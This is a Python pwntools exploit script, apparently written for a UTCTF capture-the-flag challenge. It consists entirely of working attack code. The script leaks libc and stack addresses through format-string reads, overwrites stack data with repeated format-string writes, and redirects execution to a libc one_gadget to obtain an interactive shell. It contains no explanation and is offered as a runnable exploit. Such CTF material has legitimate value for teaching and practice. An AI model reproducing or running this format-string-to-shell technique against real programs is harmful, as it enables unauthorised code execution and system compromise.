from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./pwnable"
HOST = "binary.utctf.live"
PORT = 9003
"""
HOST = "localhost"
PORT = 7777 
"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc-2.23.so')
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"]
got_printf = elf.got["printf"]
got_strcmp = elf.got["strcmp"]

off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]

#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
fini_array = 0x600e18

def exploit():
	buf_off = 6
	padding = 0x8
	payload = "%7$s,"
	payload += "A"*(padding-len(payload))
	payload += p64(got_puts)
	
	conn.sendlineafter("do?\n", payload)
	libc_puts = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_puts - off_puts
	libc_system = libc_base + off_system

	payload = "%14$p,"
	conn.sendlineafter("do?\n", payload)
	old_rbp = int(conn.recvuntil(",")[:-1],16)
	new_rsp = old_rbp - 0x50
	ret_addr = old_rbp - 0x8	
	
	#ret_addr
	padding = 0x10	
	payload = fsb(2, buf_off+(padding/8), ret_addr, 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x20)
	conn.sendlineafter("do?\n", payload)
	
	payload = fsb(2, buf_off+(padding/8), (ret_addr>>16), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x22)
	conn.sendlineafter("do?\n", payload)
	
	#payload = "A"
	#payload += fsb(1, buf_off+(padding/8), 0x100-1, 0, 1)	
	payload = fsb(2, buf_off+(padding/8), (ret_addr>>32), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x24)
	conn.sendlineafter("do?\n", payload)
	
	#ret_addr+2
	payload = fsb(2, buf_off+(padding/8), ret_addr+2, 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x28)
	conn.sendlineafter("do?\n", payload)
	
	payload = fsb(2, buf_off+(padding/8), (ret_addr+2>>16), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x28+2)
	conn.sendlineafter("do?\n", payload)
	
	#payload = "A" 
	#payload += fsb(2, buf_off+(padding/8), 0xffff, 0, 1)	
	payload = fsb(2, buf_off+(padding/8), (ret_addr+2>>32), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x28+4)
	conn.sendlineafter("do?\n", payload)
		
	#ret_addr+4
	payload = fsb(2, buf_off+(padding/8), ret_addr+4, 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x30)
	conn.sendlineafter("do?\n", payload)
	
	payload = fsb(2, buf_off+(padding/8), (ret_addr+4>>16), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x30+2)
	conn.sendlineafter("do?\n", payload)
	
	#payload = "A" 
	#payload += fsb(2, buf_off+(padding/8), 0xffff, 0, 1)	
	payload = fsb(2, buf_off+(padding/8), (ret_addr+4>>32), 0, 1)	
	payload += "A"*(padding-len(payload))
	payload += p64(new_rsp+0x30+4)
	conn.sendlineafter("do?\n", payload)
	
	payload = "%10$lx,%11$lx,%12$lx"
	conn.sendlineafter("do?\n", payload)
	print hex(ret_addr)	
	
	padding = 0x20
	one_gadget = libc_base + gadget[1]
	payload = fsb(2, buf_off+(padding/8), one_gadget, 0, 3)	
	conn.sendlineafter("do?\n", payload)
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
